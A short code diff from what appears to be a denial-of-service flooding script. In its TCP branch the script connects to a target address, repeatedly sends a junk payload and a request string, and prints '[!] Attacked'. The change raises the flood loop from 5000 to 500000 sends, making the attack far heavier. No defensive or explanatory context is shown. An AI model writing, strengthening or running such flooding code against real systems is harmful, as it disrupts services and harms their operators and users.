@@ -38,7 +38,7 @@ if method == "TCP":
                 sock.connect((ip, port))
                 sock.send(grtools)
                 sock.sendall(str.encode(request))
-                for _ in range(5000):
+                for _ in range(500000):
                     sock.send(grtools)
                     sock.sendall(str.encode(request))
                 print("[!] Attacked ")
